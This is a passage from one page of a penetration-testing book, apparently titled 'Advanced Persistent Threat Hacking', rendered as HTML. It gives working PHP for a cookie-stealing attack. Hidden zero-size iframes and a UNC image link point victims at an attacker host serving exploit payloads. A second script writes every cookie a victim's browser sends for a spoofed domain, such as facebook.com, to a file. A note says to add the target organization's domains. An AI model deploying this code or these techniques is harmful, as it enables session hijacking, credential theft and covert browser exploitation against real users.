<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf11d" class="pf w2 h2" data-page-no="11d"><div class="pc pc11d w2 h2"><img class="bi x94 y52e w6 h2e" alt="" src="bg11d.png"/><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">262<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h44 y13ef fff fse fc0 sc0 ls0 ws0">height='0' tabindex='-1' title='empty'&gt;&lt;/iframe&gt;";</div><div class="t m0 x3 h44 y13f0 fff fse fc0 sc0 ls0 ws0">    }</div><div class="t m0 x3 h44 y13f1 fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h44 y1b64 fff fse fc0 sc0 ls0 ws0">echo "&lt;img src=\"\\\\10.0.0.1\share\image.jpg\"&gt;";</div><div class="t m0 x3 h44 y1b65 fff fse fc0 sc0 ls0 ws0">echo "&lt;iframe src='http://10.0.0.1:81/bap' width='0' height='0' </div><div class="t m0 x3 h44 y1b66 fff fse fc0 sc0 ls0 ws0">tabindex='-1' title='empty'&gt;&lt;/iframe&gt;";</div><div class="t m0 x3 h44 y1b67 fff fse fc0 sc0 ls0 ws0">echo "&lt;iframe src='http://10.0.0.1:82/java' width='0' height='0' </div><div class="t m0 x3 h44 y1b68 fff fse fc0 sc0 ls0 ws0">tabindex='-1' title='empty'&gt;&lt;/iframe&gt;";</div><div class="t m0 x3 h44 y1b69 fff fse fc0 sc0 ls0 ws0">?&gt;</div><div class="t m0 x4 hd y1b6a ff4 fs7 fc0 sc0 ls0 ws0">The rst task is to read all of the domains from the domains.in.txt, which is just a </div><div class="t m0 x3 hd y1b6b ff4 fs7 fc0 sc0 ls0 ws0">ne<span class="_ _0"/>wline delimited le of domain names. It then includes an iframe for each of these </div><div class="t m0 x3 hd y1b6c ff4 fs7 fc0 sc0 ls0 ws0">domain names for the cookie/index.php le. Because all DNS requests will resolv<span class="_ _0"/>e </div><div class="t m0 x3 hd y1b6d ff4 fs7 fc0 sc0 ls0 ws0">to our host, any domains in the domains.in.txt le will resolv<span class="_ _0"/>e to our server<span class="_ _2"/>, and the </div><div class="t m0 x3 hd y1b6e ff4 fs7 fc0 sc0 ls0 ws0">user will then request cookies/index.php, which will dump an<span class="_ _0"/>y cookies av<span class="_ _0"/>ailable </div><div class="t m0 x3 hd y1b6f ff4 fs7 fc0 sc0 ls0 ws0">for that site. First, the le checks if there are any contents in the cookie and, if so, it </div><div class="t m0 x3 hd y1b70 ff4 fs7 fc0 sc0 ls0 ws0">writes it to cookie.$domain. For e<span class="_ _0"/>xample, if the user requested facebook.com, the </div><div class="t m0 x3 hd y1b71 ff4 fs7 fc0 sc0 ls0 ws0">le would be cookie.facebook.com.</div><div class="t m0 x3 h44 y1b72 fff fse fc0 sc0 ls0 ws0">&lt;?php</div><div class="t m0 x3 h44 y1b73 fff fse fc0 sc0 ls0 ws0">// Check if there are any contents to cookie</div><div class="t m0 x3 h44 y1b74 fff fse fc0 sc0 ls0 ws0">if (! empty($_COOKIE ) )</div><div class="t m0 x3 h44 y1b75 fff fse fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h44 y1b76 fff fse fc0 sc0 ls0 ws0"> $host = $_SERVER['HTTP_HOST'];</div><div class="t m0 x3 h44 y1b77 fff fse fc0 sc0 ls0 ws0"> $outFileName = "cookie.$host";</div><div class="t m0 x3 h44 y1b78 fff fse fc0 sc0 ls0 ws0"> $outFile = fopen ($outFileName, 'w' );</div><div class="t m0 x3 h44 y1b79 fff fse fc0 sc0 ls0 ws0"> $cookieContents = print_r($_COOKIE, true);</div><div class="t m0 x3 h44 y1b7a fff fse fc0 sc0 ls0 ws0"> fwrite ($outFile, "plik: ");</div><div class="t m0 x3 h44 y1b7b fff fse fc0 sc0 ls0 ws0"> fwrite ($outFile, $cookieContents );</div><div class="t m0 x3 h44 y1b7c fff fse fc0 sc0 ls0 ws0"> fclose ($outFile);</div><div class="t m0 x3 h44 y1b7d fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h44 y1b7e fff fse fc0 sc0 ls0 ws0">?&gt;</div><div class="t m0 x94 h2f y1b7f ffe fs9 fc0 sc0 ls0 ws0">NOTE</div><div class="t m0 x94 h14 y1b80 ff9 fs7 fc0 sc0 ls0 ws0">Be sure to add the domains of any websites associated with the target organization to the </div><div class="t m0 x94 h14 y1b81 ff9 fs7 fc0 sc0 ls0 ws0">domains.in.txt le.</div><a class="" href="http://facebook.com"><div class="d m1" style="border-style:none;position:absolute;left:430.657596px;bottom:446.306878px;width:64.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a><a class="" href="http://cookie.facebook.com"><div class="d m1" style="border-style:none;position:absolute;left:167.014361px;bottom:430.585034px;width:97.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>
